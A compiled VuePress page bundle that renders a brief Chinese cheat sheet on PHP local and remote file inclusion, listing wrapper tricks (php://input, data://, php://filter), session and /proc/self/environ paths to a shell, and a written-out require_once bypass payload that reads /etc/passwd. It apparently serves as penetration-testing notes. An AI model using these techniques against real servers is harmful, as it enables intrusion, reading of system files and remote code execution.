(window.webpackJsonp=window.webpackJsonp||[]).push([[19],{343:function(t,e,s){"use strict";s.r(e);var r=s(3),a=Object(r.a)({},(function(){var t=this,e=t._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"rfi-lfi-php文件包含"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#rfi-lfi-php文件包含"}},[t._v("#")]),t._v(" RFI/LFI PHP文件包含")]),t._v(" "),e("h3",{attrs:{id:"特殊文件"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#特殊文件"}},[t._v("#")]),t._v(" 特殊文件")]),t._v(" "),e("ul",[e("li",[e("p",[t._v(".htaccess")])]),t._v(" "),e("li",[e("p",[t._v(".user.ini")])]),t._v(" "),e("li",[e("p",[t._v("https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/")])]),t._v(" "),e("li",[e("p",[t._v("https://xz.aliyun.com/t/2657")])])]),t._v(" "),e("h2",{attrs:{id:"include"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#include"}},[t._v("#")]),t._v(" include")]),t._v(" "),e("ul",[e("li",[e("p",[e("code",[t._v("php://input")]),t._v(" + POST报文php代码  (allow_url_include=On)")])]),t._v(" "),e("li",[e("p",[e("code",[t._v("data://text/plain,<phpcode>")]),t._v(" (allow_url_include=On)")])]),t._v(" "),e("li",[e("p",[t._v("php7 "),e("code",[t._v("php://filter/string.strip_tags=/etc/passwd")])]),t._v(" "),e("p",[t._v("导致php在执行过程中出现segment fault错误，这样如果再此同时上传文件那么临时文件就会被保存在/tmp目录下，不会被删除。\n文件名需要爆破"),e("code",[t._v("/tmp/phpxxxxx")])])]),t._v(" "),e("li",[e("p",[t._v("session + lfi getshell")])]),t._v(" "),e("li",[e("p",[e("code",[t._v("/proc/self/environ")]),t._v("  UA header lfi getshell")])]),t._v(" "),e("li",[e("p",[t._v("phar")])])]),t._v(" "),e("h2",{attrs:{id:"require-once"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#require-once"}},[t._v("#")]),t._v(" require_once")]),t._v(" "),e("ul",[e("li",[t._v("重复包含poc:")])]),t._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/etc/passwd\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])]),e("p",[t._v("php源码分析 require_once 绕过不能重复包含文件的限制：https://www.anquanke.com/post/id/213235")]),t._v(" "),e("h2",{attrs:{id:"file-get-content-file"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#file-get-content-file"}},[t._v("#")]),t._v(" file_get_content/file")]),t._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token php language-php"}},[e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$homepage")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("file_get_contents")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'http://www.example.com/'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$homepage")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br")])]),e("p",[t._v("关于file_put_contents的一些小测试: https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/")]),t._v(" "),e("h2",{attrs:{id:"lfi-rce"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#lfi-rce"}},[t._v("#")]),t._v(" lfi -> rce")]),t._v(" "),e("p",[t._v("https://tttang.com/archive/1395/")]),t._v(" "),e("h2",{attrs:{id:"参考资料"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#参考资料"}},[t._v("#")]),t._v(" 参考资料")]),t._v(" "),e("p",[t._v("https://xz.aliyun.com/t/5535#toc-7")]),t._v(" "),e("p",[t._v("php文件包含漏洞： https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/")])])}),[],!1,null,null,null);e.default=a.exports}}]);